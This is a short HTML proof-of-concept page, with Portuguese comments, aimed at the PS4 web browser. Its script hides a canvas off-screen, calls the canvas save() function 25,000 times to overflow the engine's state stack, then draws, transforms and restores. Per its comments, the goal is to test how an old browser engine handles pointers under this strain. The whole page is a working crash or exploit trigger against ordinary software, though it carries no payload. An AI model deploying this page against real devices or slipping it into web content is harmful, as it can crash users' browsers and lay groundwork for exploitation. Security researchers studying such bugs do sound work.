
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - Canvas State Stack Exhaustion (PS4)</title>
</head>
<body>
<script>
var canvas = document.createElement('canvas');
canvas.width = 200;
canvas.height = 200;
canvas.style.cssText = 'position:absolute;left:-9999px';
document.body.appendChild(canvas);

var ctx = canvas.getContext('2d');

// Estoura o MaxSaveCount para forçar o acúmulo de unrealized saves / pilha cheia
for (var i = 0; i < 25000; i++) {
    ctx.save();
}

// Executa operações de mutação de estado e renderização com a pilha no limite,
// testando a robustez do realizeSaves e o tratamento de ponteiros da engine antiga.
ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
ctx.fillRect(0, 0, 50, 50);

ctx.translate(10, 10);
ctx.scale(1.5, 1.5);
ctx.fillRect(10, 10, 50, 50);

// Restaura alguns estados para forçar o desempilhamento
for (var j = 0; j < 100; j++) {
    ctx.restore();
}
</script>
</body>
</html>
